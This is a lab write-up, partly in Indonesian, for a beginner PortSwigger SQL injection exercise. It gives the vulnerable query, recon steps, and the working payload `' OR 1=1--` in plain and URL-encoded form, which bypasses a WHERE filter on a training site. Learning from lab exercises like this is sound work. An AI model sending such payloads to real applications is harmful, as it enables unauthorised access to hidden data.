# 🐍 SQLi #01 — Hidden Data Retrieval

> **Kategori:** SQL Injection  
> **Difficulty:** 🟢 Apprentice  
> **Link:** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)  
> **Status:** ☐ Unsolved

---

## 🧠 Understanding the Monster

Lab ini mensimulasikan sebuah toko online yang menampilkan produk berdasarkan kategori. Query SQL di baliknya kira-kira seperti ini:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Kondisi `released = 1` menyembunyikan produk yang belum dirilis. Target kita: bypass kondisi ini dan tampilkan **semua produk**, termasuk yang tersembunyi.

> **Core concept:** Injeksi karakter `'` memutus string SQL, lalu komentar `--` membuat sisa query diabaikan.

---

## 🔍 Recon

- [ ] Buka lab → klik salah satu kategori produk
- [ ] Perhatikan URL berubah: `?category=Gifts`
- [ ] Coba masukkan karakter `'` → lihat apakah ada error

**Observations:**
```
URL: https://[lab-id].web-security-academy.net/filter?category=Gifts
Error saat inject ': Internal Server Error → SQL error terekspos → injectable!
```

---

## ⚔️ Attack Plan

1. Inject ke parameter `category` di URL
2. Gunakan `'` untuk memutus string
3. Tambah `OR 1=1` agar semua baris dikembalikan
4. Tutup dengan `--` untuk komentar sisa query

---

## 💥 Exploitation

### Step 1 — Inject payload ke URL

```
/filter?category=Gifts'+OR+1=1--
```

Dalam URL encoding:
```
/filter?category=Gifts%27+OR+1%3D1--
```

**Query yang terbentuk di server:**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

`1=1` selalu true → semua produk dikembalikan. `--` men-comment `AND released = 1`.

### Step 2 — Verifikasi

Halaman seharusnya menampilkan **semua produk** termasuk yang unreleased.

---

## 🏆 Result

Lab solved ✅ — semua produk muncul, termasuk item tersembunyi.

---

## 📖 Lessons Learned

- Parameter di URL bisa langsung diinjeksi kalau tidak ada sanitasi
- `OR 1=1` adalah cara paling dasar untuk bypass kondisi WHERE
- `--` (MySQL/MSSQL) atau `#` bisa dipakai untuk komentar sisa query
- Error message yang verbose membantu attacker — production app harus mematikan ini

---

## 🔗 References

- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Codex: SQLi Cheatsheet](../../codex/sqli.md)

---

*Solved on: `YYYY-MM-DD`*
